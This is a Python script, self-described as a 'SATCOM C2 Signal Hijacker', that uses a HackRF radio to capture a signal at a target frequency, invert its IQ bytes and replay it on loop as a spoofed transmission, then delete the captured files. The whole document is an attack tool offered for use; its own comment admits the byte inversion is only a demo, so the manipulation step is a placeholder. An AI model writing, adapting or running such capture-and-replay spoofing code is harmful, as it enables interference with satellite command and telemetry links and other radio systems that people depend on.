#!/usr/bin/env python3
import subprocess
import argparse
import os
import time

CAPTURE_FILE = "satcom_capture.iq"
MODIFIED_FILE = "satcom_modified.iq"

def capture_satcom_signal(frequency, sample_rate, duration, gain):
    print(f"[+] Capturing SATCOM signal at {frequency/1e6} MHz")
    command = [
        "hackrf_transfer",
        "-r", CAPTURE_FILE,
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-l", str(gain),
        "-n", str(sample_rate * duration)
    ]
    subprocess.run(command, check=True)
    print(f"[+] Capture saved as {CAPTURE_FILE}")

def manipulate_signal(original_file, modified_file):
    print("[+] Manipulating telemetry signal")
    with open(original_file, "rb") as orig, open(modified_file, "wb") as mod:
        data = bytearray(orig.read())

        # Simple inversion for demo purposes (real attacks require specific signal knowledge)
        for i in range(len(data)):
            data[i] = ~data[i] & 0xFF

        mod.write(data)
    print(f"[+] Manipulated signal saved as {modified_file}")

def replay_modified_signal(modified_file, frequency, sample_rate, gain):
    print(f"[+] Replaying spoofed signal at {frequency/1e6} MHz")
    command = [
        "hackrf_transfer",
        "-t", modified_file,
        "-f", str(frequency),
        "-s", str(sample_rate),
        "-x", str(gain),
        "-R"
    ]
    subprocess.run(command, check=True)

def cleanup():
    print("[+] Cleaning temporary IQ files")
    for file in [CAPTURE_FILE, MODIFIED_FILE]:
        if os.path.exists(file):
            os.remove(file)
            print(f"[+] Removed {file}")

def main():
    parser = argparse.ArgumentParser(description="SATCOM C2 Signal Hijacker using HackRF")
    parser.add_argument("--frequency", type=int, required=True, help="Target frequency in Hz")
    parser.add_argument("--sample-rate", type=int, default=2000000, help="Sample rate (default 2 MHz)")
    parser.add_argument("--duration", type=int, default=10, help="Capture duration in seconds")
    parser.add_argument("--gain", type=int, default=40, help="Gain level (default 40)")

    args = parser.parse_args()

    try:
        capture_satcom_signal(args.frequency, args.sample_rate, args.duration, args.gain)
        manipulate_signal(CAPTURE_FILE, MODIFIED_FILE)
        replay_modified_signal(MODIFIED_FILE, args.frequency, args.sample_rate, args.gain)

    except KeyboardInterrupt:
        print("\n[+] Attack interrupted by user")

    except subprocess.CalledProcessError as e:
        print(f"[!] Error during execution: {e}")

    finally:
        cleanup()

if __name__ == "__main__":
    main()
